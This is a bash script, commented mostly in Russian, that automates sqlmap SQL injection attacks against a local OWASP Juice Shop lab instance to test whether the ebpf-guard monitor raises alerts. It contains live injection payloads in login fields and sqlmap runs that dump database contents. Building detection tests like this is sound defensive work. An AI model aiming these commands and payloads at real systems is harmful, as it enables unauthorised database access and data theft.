#!/bin/bash
# SQLMap自动化攻击脚本 против OWASP Juice Shop
# Цель: Тестирование способности ebpf-guard детектировать SQL injection атаки

set -e

VPS_IP="${VPS_IP:-localhost}"
JUICE_SH_URL="http://${VPS_IP}:3000"
EBPF_GUARD_API="http://${VPS_IP}:19090"
RESULTS_DIR="./sqlmap-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# Проверка наличия sqlmap
check_sqlmap() {
    if ! command -v sqlmap &> /dev/null; then
        error "sqlmap не установлен. Установите: apt-get install sqlmap"
        exit 1
    fi
    log "sqlmap найден: $(sqlmap --version | head -1)"
}

# Получение метрик до атаки
get_metrics_before() {
    log "Получение базовых метрик ebpf-guard..."
    curl -s "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-before-$TIMESTAMP.txt"
    curl -s "$EBPF_GUARD_API/alerts" > "$RESULTS_DIR/alerts-before-$TIMESTAMP.json"
    log "Метрики сохранены в $RESULTS_DIR/metrics-before-$TIMESTAMP.txt"
}

# Известные SQL injection точки в Juice Shop
JUICE_SH_SQL_ENDPOINTS=(
    # Login form SQLi
    "${JUICE_SH_URL}/rest/user/login"
    # Search SQLi
    "${JUICE_SH_URL}/rest/products/search?q="
    # Basket SQLi
    "${JUICE_SH_URL}/rest/basket/"
    # Feedback SQLi
    "${JUICE_SH_URL}/rest/feedback/"
    # Challenge SQLi
    "${JUICE_SH_URL}/rest/challenges/"
)

# Attack 1: Blind SQL Injection на login
attack_login_blind() {
    log "==========================================="
    log "ATTACK 1: Blind SQL Injection - Login Form"
    log "==========================================="

    local output_dir="$RESULTS_DIR/login_blind_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/user/login" \
        --data="email=admin@juice-sh.op\"||\"\"==\"&password=test" \
        --method=POST \
        --level=3 \
        --risk=2 \
        --batch \
        --technique=BEUSTQ \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Login blind SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 2: Error-based SQL Injection на search
attack_search_error() {
    log "==========================================="
    log "ATTACK 2: Error-based SQL Injection - Search"
    log "==========================================="

    local output_dir="$RESULTS_DIR/search_error_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/products/search?q=" \
        --method=GET \
        --level=2 \
        --risk=1 \
        --batch \
        --technique=E \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Search error-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 3: UNION-based SQL Injection
attack_union() {
    log "==========================================="
    log "ATTACK 3: UNION-based SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/union_sqli_$TIMESTAMP"
    mkdir -p "$output_dir"

    # Попытка UNION injection на нескольких endpoint'ах
    for endpoint in "${JUICE_SH_SQL_ENDPOINTS[@]}"; do
        log "Тesting UNION на: $endpoint"
        sqlmap -u "$endpoint" \
            --level=4 \
            --risk=2 \
            --batch \
            --technique=U \
            --union-cols=5 \
            --dbms=SQLite \
            --output-dir="$output_dir" \
            --flush-session \
            --parse-errors \
            2>&1 | tee -a "$output_dir/sqlmap.log" || true
        sleep 2
    done

    log "UNION-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 4: Time-based SQL Injection
attack_time_based() {
    log "==========================================="
    log "ATTACK 4: Time-based SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/time_based_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/user/login" \
        --data="email=admin@juice-sh.op'--&password=test" \
        --method=POST \
        --level=5 \
        --risk=3 \
        --batch \
        --technique=T \
        --time-sec=5 \
        --dbms=SQLite \
        --dump \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Time-based SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 5: Stacked Query SQL Injection
attack_stacked() {
    log "==========================================="
    log "ATTACK 5: Stacked Query SQL Injection"
    log "==========================================="

    local output_dir="$RESULTS_DIR/stacked_$TIMESTAMP"
    mkdir -p "$output_dir"

    sqlmap -u "${JUICE_SH_URL}/rest/basket/" \
        --method=GET \
        --level=3 \
        --risk=3 \
        --batch \
        --technique=S \
        --dbms=SQLite \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Stacked Query SQLi завершен. Результаты в $output_dir"
    sleep 5
}

# Attack 6: Full comprehensive scan
attack_comprehensive() {
    log "==========================================="
    log "ATTACK 6: Comprehensive SQL Injection Scan"
    log "==========================================="

    local output_dir="$RESULTS_DIR/comprehensive_$TIMESTAMP"
    mkdir -p "$output_dir"

    log "Запуск полного сканирования с crawl..."
    sqlmap -u "${JUICE_SH_URL}" \
        --level=5 \
        --risk=3 \
        --batch \
        --crawl=3 \
        --technique=BEUSTQ \
        --dbms=SQLite \
        --dump \
        --dump-table \
        --output-dir="$output_dir" \
        --flush-session \
        --parse-errors \
        2>&1 | tee "$output_dir/sqlmap.log"

    log "Comprehensive scan завершен. Результаты в $output_dir"
    sleep 5
}

# Получение метрик после атаки
get_metrics_after() {
    log "Получение метрик после атаки..."
    curl -s "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt"
    curl -s "$EBPF_GUARD_API/alerts" > "$RESULTS_DIR/alerts-after-$TIMESTAMP.json"

    log "Анализ новых алертов..."
    diff "$RESULTS_DIR/alerts-before-$TIMESTAMP.json" "$RESULTS_DIR/alerts-after-$TIMESTAMP.json" || true
}

# Анализ результатов
analyze_results() {
    log "==========================================="
    log "АНАЛИЗ РЕЗУЛЬТАТОВ"
    log "==========================================="

    local summary_file="$RESULTS_DIR/summary-$TIMESTAMP.txt"

    echo "SQLMAP ATTACK SUMMARY - $TIMESTAMP" > "$summary_file"
    echo "========================================" >> "$summary_file"
    echo "" >> "$summary_file"

    # Подсчет количества алертов
    local alerts_before=$(wc -l < "$RESULTS_DIR/alerts-before-$TIMESTAMP.json")
    local alerts_after=$(wc -l < "$RESULTS_DIR/alerts-after-$TIMESTAMP.json")
    local new_alerts=$((alerts_after - alerts_before))

    echo "Алерты до атаки: $alerts_before" >> "$summary_file"
    echo "Алерты после атаки: $alerts_after" >> "$summary_file"
    echo "Новых алертов: $new_alerts" >> "$summary_file"
    echo "" >> "$summary_file"

    # Анализ метрик
    echo "=== METRICS ANALYSIS ===" >> "$summary_file"
    grep -E "alerts_total|events_total|anomalies_total" "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt" >> "$summary_file" || echo "Метрики не найдены"

    echo "" >> "$summary_file"
    echo "=== SQLMAP VULNERABILITIES FOUND ===" >> "$summary_file"
    find "$RESULTS_DIR" -name "*.log" -exec grep -l "vulnerable" {} \; >> "$summary_file" || echo "Уязвимости не найдены"

    cat "$summary_file"
    log "Summary сохранен в $summary_file"
}

# Главная функция
main() {
    mkdir -p "$RESULTS_DIR"

    log "==========================================="
    log "SQLMAP AUTOMATION AGAINST JUICE SHOP"
    log "==========================================="
    log "Juice Shop URL: $JUICE_SH_URL"
    log "ebpf-guard API: $EBPF_GUARD_API"
    log "Results dir: $RESULTS_DIR"
    log "==========================================="

    check_sqlmap
    get_metrics_before

    # Запуск атак по очереди
    attack_login_blind
    attack_search_error
    attack_union
    attack_time_based
    attack_stacked
    attack_comprehensive

    get_metrics_after
    analyze_results

    log "==========================================="
    log "ВСЕ АТАКИ ЗАВЕРШЕНЫ"
    log "==========================================="
    log "Результаты сохранены в: $RESULTS_DIR"
    log "Проверьте ebpf-guard alerts: $EBPF_GUARD_API/alerts"
}

# Запуск
main "$@"
